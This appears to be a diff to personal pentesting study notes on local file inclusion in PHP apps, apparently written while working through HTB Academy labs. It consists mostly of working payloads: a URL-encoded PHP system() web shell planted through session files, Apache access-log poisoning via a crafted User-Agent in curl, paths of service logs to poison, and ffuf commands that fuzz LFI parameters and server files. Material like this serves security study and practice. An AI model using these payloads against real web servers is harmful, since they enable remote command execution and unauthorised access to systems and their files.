@@ -99,3 +99,61 @@ and we can call the payload as follow
     http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 
 ## LOG poisoning my favourite <3
+### Sessions
+
+If the app uses sessions, than probably it stores the sessions in `/var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. `
+if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.`
+
+and now try the LFI using the sessions:
+
+    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+
+it does exist, and now we have to load the payload
+
+    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+final step is to execute the shell
+
+    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+## Server Log Poisoning
+
+Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above. (src : htb academy)
+
+So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get the etc/password
+
+in burp suite or curl, we change the user agent to the payload and execute another request.
+
+    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+
+and next, we should execute normal curl with the fli to `/var/log/apache2/access.log` and add the `&cmd=id`
+
+of i can directlyy write the bash command without the cmd : example
+
+     curl -s http://94.237.59.180:46754/index.php -A "<?php system('id'); ?>"
+
+and then just access the log page
+
+Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
+
+    /var/log/sshd.log
+    /var/log/mail
+    /var/log/vsftpd.log
+
+## FUZZING 
+parameters : 
+
+    ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+lfi wordlist!
+
+    ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+or just use `LFI-Jhaddix.txt`
+
+Server files 
+
+    ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+Server logs and configurations
+
+    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
